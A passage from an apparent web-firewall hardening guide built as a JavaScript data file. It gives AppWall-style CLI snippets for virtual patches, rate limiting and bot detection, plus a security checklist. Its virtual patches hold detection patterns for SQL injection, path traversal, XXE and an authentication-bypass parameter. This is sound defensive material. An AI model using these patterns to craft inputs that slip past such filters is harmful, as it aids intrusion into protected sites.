                    <div><span class="code-command">patch</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"CVE-2023-XXXXX-LegacyCMS-SQLi"</span></div>
                    <div><span class="code-command">patch</span> <span class="code-value">"CVE-2023-XXXXX-LegacyCMS-SQLi"</span></div>
                    <div><span class="code-param">description</span> <span class="code-value">"Virtual patch for SQL injection in Legacy CMS search parameter"</span></div>
                    <div><span class="code-param">cve</span> <span class="code-value">"CVE-2023-XXXXX"</span></div>
                    <div><span class="code-param">url</span> <span class="code-value">"/legacy/search.php"</span></div>
                    <div><span class="code-param">parameter</span> <span class="code-value">"q"</span></div>
                    <div><span class="code-param">pattern</span> <span class="code-value">"['\"\\;]+"</span></div>
                    <div><span class="code-param">action</span> <span class="code-value">block</span></div>
                    <div><span class="code-param">expiration</span> <span class="code-value">"2026-01-01"</span></div>
                    <div><span class="code-param">status</span> <span class="code-value">active</span></div>
                    <div class="code-comment"># Create a virtual patch for path traversal</div>
                    <div><span class="code-command">patch</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"File-Download-Path-Traversal"</span></div>
                    <div><span class="code-command">patch</span> <span class="code-value">"File-Download-Path-Traversal"</span></div>
                    <div><span class="code-param">description</span> <span class="code-value">"Virtual patch for path traversal in file download function"</span></div>
                    <div><span class="code-param">url</span> <span class="code-value">"/download.php"</span></div>
                    <div><span class="code-param">parameter</span> <span class="code-value">"file"</span></div>
                    <div><span class="code-param">allowed-pattern</span> <span class="code-value">"^[a-zA-Z0-9_-]+\\.(pdf|doc|docx|xls|xlsx|txt)$"</span></div>
                    <div><span class="code-param">action</span> <span class="code-value">block</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Virtual Patching Approach</h5>
                <p class="mb-4 text-gray-700">Effective virtual patching involves a systematic approach:</p>
                <ol class="list-decimal pl-6 mb-4 text-gray-700">
                    <li class="mb-2">Identify the vulnerability details (location, exploit method)</li>
                    <li class="mb-2">Create a targeted rule focusing on the specific vulnerability</li>
                    <li class="mb-2">Test the patch against both exploit attempts and legitimate traffic</li>
                    <li class="mb-2">Document the purpose, limitations, and expected lifespan of the patch</li>
                    <li>Monitor for bypass attempts and refine the patch as needed</li>
                </ol>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Advanced Virtual Patching Techniques</h5>
                <p class="mb-4 text-gray-700">Implement comprehensive virtual patching with advanced detection capabilities:</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure advanced virtual patching</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">virtual-patches</span></div>
                    <div class="code-comment"># Create multi-condition patch for authenticated vulnerability</div>
                    <div><span class="code-command">patch</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"CVE-2023-YYYYY-Auth-Bypass"</span></div>
                    <div><span class="code-command">patch</span> <span class="code-value">"CVE-2023-YYYYY-Auth-Bypass"</span></div>
                    <div><span class="code-param">description</span> <span class="code-value">"Virtual patch for authentication bypass in admin portal"</span></div>
                    <div><span class="code-param">cve</span> <span class="code-value">"CVE-2023-YYYYY"</span></div>
                    <div><span class="code-param">url</span> <span class="code-value">"/admin/console.php"</span></div>
                    <div class="code-comment"># Define multi-condition check</div>
                    <div><span class="code-command">condition</span></div>
                    <div><span class="code-param">cookie-exists</span> <span class="code-value">"admin_session"</span> <span class="code-param">not</span></div>
                    <div><span class="code-param">and</span></div>
                    <div><span class="code-param">parameter-exists</span> <span class="code-value">"bypass_auth"</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div><span class="code-param">action</span> <span class="code-value">block</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Create behavior-based virtual patch</div>
                    <div><span class="code-command">patch</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"XML-XXE-Prevention"</span></div>
                    <div><span class="code-command">patch</span> <span class="code-value">"XML-XXE-Prevention"</span></div>
                    <div><span class="code-param">description</span> <span class="code-value">"Prevents XXE attacks in XML processing"</span></div>
                    <div><span class="code-param">content-type</span> <span class="code-value">"application/xml"</span></div>
                    <div><span class="code-param">request-body-pattern</span> <span class="code-value">"<!DOCTYPE|<!ENTITY"</span></div>
                    <div><span class="code-param">action</span> <span class="code-value">sanitize</span></div>
                    <div><span class="code-param">sanitize-method</span> <span class="code-value">"remove-doctype"</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        },
        {
            title: 'Rate Limiting and Anti-Automation Rules',
            content: `
                <p class="mb-4 text-gray-700">Configure rate limiting to prevent abuse, brute force attempts, and excessive resource consumption.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure rate limiting for specific endpoints</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">rate-limiting</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Set global defaults</div>
                    <div><span class="code-param">default-requests-per-second</span> <span class="code-value">100</span></div>
                    <div><span class="code-param">default-burst-size</span> <span class="code-value">200</span></div>
                    <div><span class="code-param">default-action</span> <span class="code-value">throttle</span></div>
                    <div class="code-comment"># Configure endpoint-specific limits</div>
                    <div><span class="code-command">endpoint</span> <span class="code-value">add</span> <span class="code-param">url</span> <span class="code-value">"/api/search"</span></div>
                    <div><span class="code-command">endpoint</span> <span class="code-value">"/api/search"</span></div>
                    <div><span class="code-param">requests-per-second</span> <span class="code-value">20</span></div>
                    <div><span class="code-param">burst-size</span> <span class="code-value">40</span></div>
                    <div><span class="code-param">action</span> <span class="code-value">throttle</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Configure sensitive endpoints with stricter limits</div>
                    <div><span class="code-command">endpoint</span> <span class="code-value">add</span> <span class="code-param">url</span> <span class="code-value">"/login"</span></div>
                    <div><span class="code-command">endpoint</span> <span class="code-value">"/login"</span></div>
                    <div><span class="code-param">requests-per-second</span> <span class="code-value">5</span></div>
                    <div><span class="code-param">burst-size</span> <span class="code-value">10</span></div>
                    <div><span class="code-param">action</span> <span class="code-value">block</span></div>
                    <div><span class="code-param">block-period</span> <span class="code-value">300</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Configure heavy resource endpoints</div>
                    <div><span class="code-command">endpoint</span> <span class="code-value">add</span> <span class="code-param">url</span> <span class="code-value">"/api/report"</span></div>
                    <div><span class="code-command">endpoint</span> <span class="code-value">"/api/report"</span></div>
                    <div><span class="code-param">requests-per-second</span> <span class="code-value">2</span></div>
                    <div><span class="code-param">burst-size</span> <span class="code-value">5</span></div>
                    <div><span class="code-param">action</span> <span class="code-value">throttle</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Rate Limiting Best Practices</h5>
                <p class="mb-4 text-gray-700">Implement rate limiting based on application requirements:</p>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Endpoint-Specific Limits:</strong> Different limits for different endpoint sensitivity</li>
                    <li class="mb-2"><strong>User-Based vs. IP-Based:</strong> Consider authenticated user limits vs. IP address limits</li>
                    <li class="mb-2"><strong>Graduated Response:</strong> Escalate from throttling to blocking for persistent abuse</li>
                    <li class="mb-2"><strong>Response Feedback:</strong> Clear error messages with retry-after headers</li>
                    <li><strong>Whitelisting:</strong> Configure exemptions for trusted systems (monitoring, essential services)</li>
                </ul>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Advanced Anti-Automation Rules</h5>
                <p class="mb-4 text-gray-700">Implement sophisticated anti-automation measures to identify and block bots and automated scripts:</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure anti-automation defenses</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">anti-automation</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Set up browser fingerprinting</div>
                    <div><span class="code-command">browser-validation</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">detection-methods</span> <span class="code-value">"js-challenge,header-analysis,canvas-fingerprint"</span></div>
                    <div><span class="code-param">action</span> <span class="code-value">challenge</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Configure request pattern detection</div>
                    <div><span class="code-command">pattern-detection</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">consistent-user-agent</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">navigation-timing</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">request-timing-threshold</span> <span class="code-value">50</span></div>
                    <div><span class="code-param">action</span> <span class="code-value">captcha</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Set up behavior-based detection</div>
                    <div><span class="code-command">behavior-analysis</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">mouse-movement</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">mouse-click</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">keyboard-timing</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">scrolling-pattern</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">detection-threshold</span> <span class="code-value">high</span></div>
                    <div><span class="code-param">action</span> <span class="code-value">block</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        },
        {
            title: 'Dynamic Rule Management',
            content: `
                <p class="mb-4 text-gray-700">Implement dynamic rule activation and management based on different conditions and triggers.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure dynamic rule management</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">dynamic-rules</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure threat-based rule activation</div>
                    <div><span class="code-command">rule-set</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"high-security"</span></div>
                    <div><span class="code-command">rule-set</span> <span class="code-value">"high-security"</span></div>
                    <div><span class="code-param">parameter-validation</span> <span class="code-value">strict</span></div>
                    <div><span class="code-param">csrf-protection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">rate-limiting</span> <span class="code-value">aggressive</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Configure time-based activation</div>
                    <div><span class="code-command">schedule</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"business-hours"</span></div>
                    <div><span class="code-command">schedule</span> <span class="code-value">"business-hours"</span></div>
                    <div><span class="code-param">days</span> <span class="code-value">"monday-friday"</span></div>
                    <div><span class="code-param">start-time</span> <span class="code-value">"09:00"</span></div>
                    <div><span class="code-param">end-time</span> <span class="code-value">"17:00"</span></div>
                    <div><span class="code-param">timezone</span> <span class="code-value">"UTC"</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Configure trigger-based activation</div>
                    <div><span class="code-command">trigger</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"attack-detection"</span></div>
                    <div><span class="code-command">trigger</span> <span class="code-value">"attack-detection"</span></div>
                    <div><span class="code-param">condition</span> <span class="code-value">"attack-score > 75"</span></div>
                    <div><span class="code-param">activate-rule-set</span> <span class="code-value">"high-security"</span></div>
                    <div><span class="code-param">duration</span> <span class="code-value">3600</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Configure geolocation-based activation</div>
                    <div><span class="code-command">geo-rule</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"high-risk-countries"</span></div>
                    <div><span class="code-command">geo-rule</span> <span class="code-value">"high-risk-countries"</span></div>
                    <div><span class="code-param">countries</span> <span class="code-value">"XX,YY,ZZ"</span></div>
                    <div><span class="code-param">activate-rule-set</span> <span class="code-value">"high-security"</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Adaptive Rule Management Strategies</h5>
                <p class="mb-4 text-gray-700">Implement a comprehensive approach to dynamic rule management:</p>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Threat Intelligence Integration:</strong> Activate rules based on current threat landscape</li>
                    <li class="mb-2"><strong>Traffic Pattern Analysis:</strong> Adjust rules based on observed traffic patterns</li>
                    <li class="mb-2"><strong>Time-Based Activation:</strong> Deploy different rule sets during business vs. non-business hours</li>
                    <li class="mb-2"><strong>Geographic Targeting:</strong> Apply different security levels based on traffic origin</li>
                    <li class="mb-2"><strong>User Context:</strong> Vary rule enforcement based on user authentication status</li>
                    <li><strong>Attack Chain Detection:</strong> Progressively activate rules as attack patterns emerge</li>
                </ul>
            `
        }
    ],
    tools: [
        {
            title: 'Rule Testing Framework',
            icon: 'fa-flask',
            description: 'Framework for testing custom rules against legitimate and malicious traffic patterns.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'AppWall Testing'
        },
        {
            title: 'CSRF Tester',
            icon: 'fa-link-slash',
            description: 'Tool for validating CSRF protection by simulating cross-site request attempts.',
            link: 'https://owasp.org/www-project-zap/',
            linkText: 'OWASP ZAP'
        },
        {
            title: 'Parameter Fuzzer',
            icon: 'fa-random',
            description: 'Generate various inputs to test parameter validation rules and identify weaknesses.',
            link: 'https://github.com/ffuf/ffuf',
            linkText: 'FFUF'
        },
        {
            title: 'Rule Performance Analyzer',
            icon: 'fa-tachometer-alt',
            description: 'Analyze the performance impact of custom security rules on application response time.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Performance Tools'
        },
        {
            title: 'ModSecurity Rule Editor',
            icon: 'fa-edit',
            description: 'Interactive editor for creating and testing ModSecurity compatible custom rules.',
            link: 'https://github.com/SpiderLabs/ModSecurity',
            linkText: 'ModSecurity'
        },
        {
            title: 'Regular Expression Tester',
            icon: 'fa-code',
            description: 'Test and optimize regular expressions used in security rules for accuracy and performance.',
            link: 'https://regex101.com/',
            linkText: 'Regex101'
        },
        {
            title: 'Traffic Replay Tool',
            icon: 'fa-redo',
            description: 'Capture and replay real traffic patterns to test rule effectiveness in production scenarios.',
            link: 'https://github.com/buger/goreplay',
            linkText: 'GoReplay'
        },
        {
            title: 'WAF Rule Converter',
            icon: 'fa-exchange-alt',
            description: 'Convert security rules between different WAF formats for multi-platform deployment.',
            link: 'https://github.com/coreruleset/coreruleset',
            linkText: 'Core Rule Set'
        },
        {
            title: 'API Security Testing Framework',
            icon: 'fa-plug',
            description: 'Specialized testing for API-specific security rules and parameter validation.',
            link: 'https://github.com/OWASP/APISecurityProject',
            linkText: 'OWASP API Security'
        },
        {
            title: 'Business Logic Attack Simulator',
            icon: 'fa-sitemap',
            description: 'Simulate attacks targeting application business logic to validate custom protection rules.',
            link: 'https://owasp.org/www-project-web-security-testing-guide/',
            linkText: 'OWASP Testing Guide'
        },
        {
            title: 'Bot Traffic Simulator',
            icon: 'fa-robot',
            description: 'Generate automated bot traffic patterns to test anti-automation rule effectiveness.',
            link: 'https://github.com/zalando/zuchini',
            linkText: 'Zuchini'
        },
        {
            title: 'Rule Visualization Tool',
            icon: 'fa-project-diagram',
            description: 'Visualize complex rule relationships and dependency chains for better management.',
            link: 'https://www.graphviz.org/',
            linkText: 'Graphviz'
        }
    ]
},
        {
    id: 'threat-protection',
    title: '7. Advanced Threat Protection',
    subtitle: 'Bot detection, API security, and anti-automation controls',
    icon: 'fa-robot',
    priority: 'critical',
    progress: 0,
    checklist: [
        {
            title: '7.1 Bot Protection',
            icon: 'fa-robot',
            items: [
                { id: '7.1.1', text: 'Enable and configure bot detection mechanisms', priority: 'critical' },
                { id: '7.1.2', text: 'Set up CAPTCHA or challenge-response systems', priority: 'high' },
                { id: '7.1.3', text: 'Configure browser validation techniques', priority: 'high' },
                { id: '7.1.4', text: 'Implement device fingerprinting for bot detection', priority: 'medium' },
                { id: '7.1.5', text: 'Set up behavioral analysis for bot identification', priority: 'high' },
                { id: '7.1.6', text: 'Configure rate limiting and throttling policies', priority: 'critical' },
                { id: '7.1.7', text: 'Define bot signatures for known automation tools', priority: 'high' },
                { id: '7.1.8', text: 'Set up progressive bot challenges based on risk level', priority: 'medium' },
                { id: '7.1.9', text: 'Implement JavaScript-based bot detection', priority: 'high' },
                { id: '7.1.10', text: 'Configure canvas fingerprinting for browser identification', priority: 'medium' },
                { id: '7.1.11', text: 'Set up mouse movement pattern analysis', priority: 'medium' },
                { id: '7.1.12', text: 'Implement keyboard interaction monitoring', priority: 'medium' },
                { id: '7.1.13', text: 'Configure bot trap endpoints and honeypots', priority: 'high' },
                { id: '7.1.14', text: 'Set up browser environment validation', priority: 'high' },
                { id: '7.1.15', text: 'Implement WebSocket-based continuous monitoring', priority: 'medium' },
                { id: '7.1.16', text: 'Configure page interaction verification', priority: 'high' }
            ]
        },
        {
            title: '7.2 API Security',
            icon: 'fa-plug',
            items: [
                { id: '7.2.1', text: 'Set up API-specific security policies', priority: 'critical' },
                { id: '7.2.2', text: 'Configure API authentication validation', priority: 'critical' },
                { id: '7.2.3', text: 'Implement API rate limiting controls', priority: 'high' },
                { id: '7.2.4', text: 'Set up schema validation for API requests/responses', priority: 'high' },
                { id: '7.2.5', text: 'Configure API-specific attack signatures', priority: 'high' },
                { id: '7.2.6', text: 'Enable API access control validation', priority: 'critical' },
                { id: '7.2.7', text: 'Implement API versioning protection', priority: 'medium' },
                { id: '7.2.8', text: 'Configure API endpoint restrictions', priority: 'high' },
                { id: '7.2.9', text: 'Set up JWT token validation and verification', priority: 'critical' },
                { id: '7.2.10', text: 'Implement API scope validation for OAuth', priority: 'high' },
                { id: '7.2.11', text: 'Configure GraphQL query depth and complexity limits', priority: 'high' },
                { id: '7.2.12', text: 'Set up API payload size restrictions', priority: 'medium' },
                { id: '7.2.13', text: 'Implement API response filtering for sensitive data', priority: 'high' },
                { id: '7.2.14', text: 'Configure API request sequence validation', priority: 'medium' },
                { id: '7.2.15', text: 'Set up API abuse pattern detection', priority: 'high' },
                { id: '7.2.16', text: 'Implement API key rotation and management', priority: 'high' }
            ]
        },
        {
            title: '7.3 Anti-Automation',
            icon: 'fa-shield-alt',
            items: [
                { id: '7.3.1', text: 'Configure anti-scraping protections', priority: 'high' },
                { id: '7.3.2', text: 'Set up credential stuffing prevention', priority: 'critical' },
                { id: '7.3.3', text: 'Implement account takeover protection', priority: 'critical' },
                { id: '7.3.4', text: 'Configure session anomaly detection', priority: 'high' },
                { id: '7.3.5', text: 'Set up IP reputation filtering', priority: 'high' },
                { id: '7.3.6', text: 'Enable geographic-based access restrictions', priority: 'medium' },
                { id: '7.3.7', text: 'Implement human verification for suspicious traffic', priority: 'high' },
                { id: '7.3.8', text: 'Configure behavior-based anomaly detection', priority: 'high' },
                { id: '7.3.9', text: 'Set up form submission velocity checks', priority: 'high' },
                { id: '7.3.10', text: 'Implement progressive friction techniques', priority: 'medium' },
                { id: '7.3.11', text: 'Configure dynamic content rendering for anti-scraping', priority: 'medium' },
                { id: '7.3.12', text: 'Set up honeypot form fields to detect automation', priority: 'medium' },
                { id: '7.3.13', text: 'Implement multi-factor authentication for high-risk actions', priority: 'critical' },
                { id: '7.3.14', text: 'Configure time-of-day based security policies', priority: 'medium' },
                { id: '7.3.15', text: 'Set up user behavioral profiling', priority: 'high' },
                { id: '7.3.16', text: 'Implement content obfuscation techniques', priority: 'medium' }
            ]
        },
        {
            title: '7.4 Advanced Attack Mitigation',
            icon: 'fa-user-ninja',
            items: [
                { id: '7.4.1', text: 'Configure protection against Layer 7 DDoS attacks', priority: 'critical' },
                { id: '7.4.2', text: 'Set up behavioral DoS protection', priority: 'high' },
                { id: '7.4.3', text: 'Implement slowloris and slow POST attack mitigation', priority: 'high' },
                { id: '7.4.4', text: 'Configure protection against HTTP/2 abuse', priority: 'medium' },
                { id: '7.4.5', text: 'Set up zero-day attack protection mechanisms', priority: 'high' },
                { id: '7.4.6', text: 'Implement protection against advanced evasion techniques', priority: 'high' },
                { id: '7.4.7', text: 'Configure coordinated attack detection', priority: 'medium' },
                { id: '7.4.8', text: 'Set up resource exhaustion protection', priority: 'high' },
                { id: '7.4.9', text: 'Implement protocol anomaly detection', priority: 'high' },
                { id: '7.4.10', text: 'Configure HTTP request smuggling protection', priority: 'high' },
                { id: '7.4.11', text: 'Set up cache poisoning defenses', priority: 'medium' },
                { id: '7.4.12', text: 'Implement advanced network traffic analysis', priority: 'high' },
                { id: '7.4.13', text: 'Configure HTTP flood protection with machine learning', priority: 'high' },
                { id: '7.4.14', text: 'Set up defense against ransom DDoS attacks', priority: 'high' },
                { id: '7.4.15', text: 'Implement CDN-based attack mitigation', priority: 'medium' },
                { id: '7.4.16', text: 'Configure adaptive security posture based on attack signals', priority: 'high' }
            ]
        },
        {
            title: '7.5 Behavioral Analysis',
            icon: 'fa-chart-line',
            items: [
                { id: '7.5.1', text: 'Set up user behavior baseline profiling', priority: 'high' },
                { id: '7.5.2', text: 'Implement session behavior tracking', priority: 'high' },
                { id: '7.5.3', text: 'Configure anomalous behavior detection thresholds', priority: 'critical' },
                { id: '7.5.4', text: 'Set up navigation pattern analysis', priority: 'medium' },
                { id: '7.5.5', text: 'Implement click pattern profiling and validation', priority: 'medium' },
                { id: '7.5.6', text: 'Configure typing pattern and cadence analysis', priority: 'medium' },
                { id: '7.5.7', text: 'Set up abnormal request sequence detection', priority: 'high' },
                { id: '7.5.8', text: 'Implement user-agent consistency validation', priority: 'high' },
                { id: '7.5.9', text: 'Configure interaction time anomaly detection', priority: 'medium' },
                { id: '7.5.10', text: 'Set up behavioral biometrics for authentication', priority: 'high' },
                { id: '7.5.11', text: 'Implement progressive session risk scoring', priority: 'high' },
                { id: '7.5.12', text: 'Configure machine learning based anomaly detection', priority: 'high' }
            ]
        },
        {
            title: '7.6 Threat Intelligence Integration',
            icon: 'fa-brain',
            items: [
                { id: '7.6.1', text: 'Implement IP reputation data feeds', priority: 'high' },
                { id: '7.6.2', text: 'Configure automated blocking of known malicious IPs', priority: 'high' },
                { id: '7.6.3', text: 'Set up integration with commercial threat intelligence', priority: 'medium' },
                { id: '7.6.4', text: 'Implement known attack pattern recognition', priority: 'high' },
                { id: '7.6.5', text: 'Configure file hash reputation checking', priority: 'medium' },
                { id: '7.6.6', text: 'Set up domain reputation validation', priority: 'high' },
                { id: '7.6.7', text: 'Implement threat actor technique detection', priority: 'high' },
                { id: '7.6.8', text: 'Configure vulnerable component tracking', priority: 'high' },
                { id: '7.6.9', text: 'Set up zero-day vulnerability protection', priority: 'critical' },
                { id: '7.6.10', text: 'Implement emerging threat feeds', priority: 'high' },
                { id: '7.6.11', text: 'Configure IOC (Indicators of Compromise) scanning', priority: 'high' },
                { id: '7.6.12', text: 'Set up industry-specific threat intelligence', priority: 'medium' }
            ]
        }
    ],
    techniques: [
        {
            title: 'Bot Protection Configuration',
            content: `
                <p class="mb-4 text-gray-700">Implement comprehensive bot detection and prevention to protect against automated attacks.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure bot protection</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">bot-protection</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">detection-level</span> <span class="code-value">high</span></div>
                    <div class="code-comment"># JavaScript-based browser validation</div>
                    <div><span class="code-command">browser-verification</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">action</span> <span class="code-value">challenge</span></div>
                    <div class="code-comment"># CAPTCHA protection</div>
                    <div><span class="code-command">captcha-protection</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">trigger-threshold</span> <span class="code-value">suspicious</span></div>
                    <div class="code-comment"># Rate limiting</div>
                    <div><span class="code-command">rate-limiting</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">requests-per-second</span> <span class="code-value">10</span></div>
                    <div><span class="code-param">burst</span> <span class="code-value">20</span></div>
                    <div><span class="code-param">action</span> <span class="code-value">temporary-block</span></div>
                    <div class="code-comment"># Fingerprinting</div>
                    <div><span class="code-command">fingerprinting</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">methods</span> <span class="code-value">browser,device,network</span></div>
                    <div class="code-comment"># Bot signatures</div>
                    <div><span class="code-command">signature</span> <span class="code-value">enable-category</span> <span class="code-param">name</span> <span class="code-value">"scrapers"</span></div>
                    <div><span class="code-command">signature</span> <span class="code-value">enable-category</span> <span class="code-param">name</span> <span class="code-value">"automation-tools"</span></div>
                    <div><span class="code-command">signature</span> <span class="code-value">enable-category</span> <span class="code-param">name</span> <span class="code-value">"vulnerability-scanners"</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Bot Detection Techniques</h5>
                <p class="mb-4 text-gray-700">Modern bot protection employs multiple detection techniques to identify automated traffic:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Technique</th>
                            <th class="p-3 border bg-gray-100">Description</th>
                            <th class="p-3 border bg-gray-100">Effectiveness</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">JavaScript Challenges</td>
                            <td class="p-3 border">Validates if the client can execute JavaScript code</td>
                            <td class="p-3 border">Medium - Can be bypassed by advanced bots</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Browser Fingerprinting</td>
                            <td class="p-3 border">Analyzes browser characteristics for inconsistencies</td>
                            <td class="p-3 border">High - Difficult to perfectly simulate browsers</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">CAPTCHA</td>
                            <td class="p-3 border">Visual or audio challenges to verify human users</td>
                            <td class="p-3 border">High - But impacts user experience</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Behavioral Analysis</td>
                            <td class="p-3 border">Monitors mouse movements, typing patterns, and navigation</td>
                            <td class="p-3 border">Very High - Advanced bots struggle to mimic</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Rate Limiting</td>
                            <td class="p-3 border">Restricts requests based on frequency and patterns</td>
                            <td class="p-3 border">Medium - Slows but doesn't stop sophisticated bots</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Device Fingerprinting</td>
                            <td class="p-3 border">Identifies unique device characteristics</td>
                            <td class="p-3 border">High - Difficult to spoof completely</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Advanced Bot Detection Implementation</h5>
                <p class="mb-4 text-gray-700">Configure advanced bot detection mechanisms with behavioral analysis:</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure advanced bot detection</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">bot-protection</span></div>
                    <div class="code-comment"># Advanced browser verification</div>
                    <div><span class="code-command">advanced-verification</span></div>
                    <div><span class="code-param">canvas-fingerprinting</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">webgl-fingerprinting</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">font-detection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">plugin-analysis</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Behavioral biometrics</div>
                    <div><span class="code-command">behavioral-biometrics</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">mouse-movement</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">mouse-click-pattern</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">scrolling-behavior</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">typing-cadence</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">touch-gestures</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">session-duration</span> <span class="code-value">300</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Bot traps and honeypots</div>
                    <div><span class="code-command">bot-traps</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">hidden-link-traps</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">css-hidden-fields</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">javascript-honeytraps</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">delayed-elements</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        },
        {
            title: 'API Security Configuration',
            content: `
                <p class="mb-4 text-gray-700">Implement dedicated API security controls to protect web services and API endpoints.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure API security</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
